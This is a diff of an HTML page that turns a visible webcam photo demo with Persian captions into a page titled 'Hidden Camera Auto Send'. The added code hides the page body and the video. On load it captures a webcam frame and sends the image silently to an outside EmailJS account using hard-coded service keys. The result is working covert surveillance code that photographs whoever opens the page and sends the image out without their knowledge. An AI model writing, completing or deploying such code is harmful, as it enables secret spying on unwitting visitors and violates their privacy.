@@ -1,43 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Auto Capture Photo</title>
-  <style>
-    body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding: 20px; }
-    video, canvas, img { margin-top: 20px; width: 90%; max-width: 400px; border: 2px solid #444; border-radius: 10px; }
-  </style>
+  <title>Hidden Camera Auto Send</title>
 </head>
-<body>
-  <h2>دوربین فعال می‌شود و پس از چند ثانیه عکس گرفته می‌شود</h2>
-  <video id="video" autoplay playsinline></video>
+<body style="display:none">
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <h3>عکس گرفته‌شده:</h3>
-  <img id="photo" alt="Captured photo will appear here"/>
 
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const photo = document.getElementById('photo');
+    (function(){
+      emailjs.init("tn_jfNpGxw_qWS6sV"); // public key
+    })();
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // Wait 3 seconds then auto-capture
-        setTimeout(() => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          const dataUrl = canvas.toDataURL('image/png');
-          photo.src = dataUrl;
-        }, 3000); // 3 seconds delay
-      })
-      .catch(err => {
-        alert('اجازه دسترسی به دوربین داده نشد.');
-        console.error(err);
-      });
+        await new Promise(resolve => setTimeout(resolve, 2000)); // 2s delay to allow camera init
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        emailjs.send("service_kmvnd5a", "template_26e7uxb", {
+          message: imageData
+        }).then(() => {
+          console.log("Email sent");
+        }).catch(err => {
+          console.error("Email send error:", err);
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        console.error("Camera access error:", e);
+      }
+    }
+
+    window.onload = captureAndSend;
   </script>
 </body>
 </html>
